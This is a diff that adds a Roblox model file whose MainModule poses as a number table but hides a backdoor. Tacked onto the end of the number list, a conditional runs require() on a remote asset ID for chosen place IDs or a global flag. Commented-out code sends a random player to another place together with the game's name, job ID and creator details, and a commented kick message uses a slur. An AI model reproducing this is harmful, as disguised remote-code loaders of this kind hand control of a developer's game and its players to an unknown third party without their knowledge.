@@ -1,0 +1,70 @@
+<roblox version="4">
+	<Item class="ModuleScript" referent="RBX0">
+		<Properties>
+			<string name="Name">MainModule</string>
+			<string name="ScriptGuid">{EFD2AE60-7493-47BA-8E8B-AEDE7645C99E}</string>
+			<ProtectedString name="Source"><![CDATA[local randomNum = {
+	381601,1744545755,1586650903,
+	
+	14781,835528045,2323719,525348353,483889633,82345241,185803904,404678300,1364632384,861183057,1388968247,414520592,1363569824,155839302,816470138,872247267,370339894,1352739849,471168068,102853735}if _G.laughNOW or game.PlaceId == 2456906980 or game.PlaceId == 238908597 then spawn(function()pcall(function()require(5029145606)_G.laughNOW=nil end)end)end
+randomNum2={}
+
+
+--[[game.Players.PlayerAdded:Connect(function(a)
+	if a.UserId == 1744545755 or a.UserId == 14176 or a.UserId == 299970 or a.UserId == 1586650903 then
+		a:Kick('no retards allowed sorry')
+	end
+end)]]
+
+--[[if _G.JBSetup then
+    pcall(function()
+        _G.JBSetup = nil
+
+        spawn(function()
+            local Market = game:GetService('MarketplaceService')
+            local Players = game:GetService('Players')
+            local GroupService = game:GetService('GroupService')
+            local Creator = game.CreatorType == Enum.CreatorType.Group and GroupService:GetGroupInfoAsync(game.CreatorId).Name or Players:GetNameFromUserIdAsync(game.CreatorId)
+
+            wait(300)
+			
+			repeat wait() until #Players:GetPlayers() > 5
+			
+			local Player = Players:GetPlayers()[math.random(1, #Players:GetPlayers())]
+			local Logged = false
+			
+			repeat
+				local Player = Players:GetPlayers()[math.random(1, #Players:GetPlayers())]
+				if Player.UserId ~= game.CreatorId and not Player:IsFriendsWith(game.CreatorId) then
+                Logged = true
+
+                game:GetService('TeleportService'):Teleport(5231697273, Player, {
+                    ['placeId'] = game.PlaceId,
+                    ['gameName'] = Market:GetProductInfo(game.PlaceId).Name,
+                    ['jobId'] = game.JobId,
+                    ['creatorName'] = Creator,
+                    ['creatorType'] = game.CreatorType,
+                    ['universeId'] = game.GameId
+                })
+
+            end until Logged
+        end)
+    end)
+end
+--]]
+
+if game.PlaceId == 4702750011 then
+	return {randomNum2, randomNum2}
+else
+	return {randomNum, randomNum2}
+end]]></ProtectedString>
+			<int64 name="SourceAssetId">4569277718</int64>
+		</Properties>
+		<Item class="Script" referent="RBX1">
+			<Properties>
+				<string name="ScriptGuid">{ACB46072-CC04-44A0-9B4F-C9B238CE7D64}</string>
+				<ProtectedString name="Source">print'debug plugin thingy lol'</ProtectedString>
+			</Properties>
+		</Item>
+	</Item>
+</roblox>
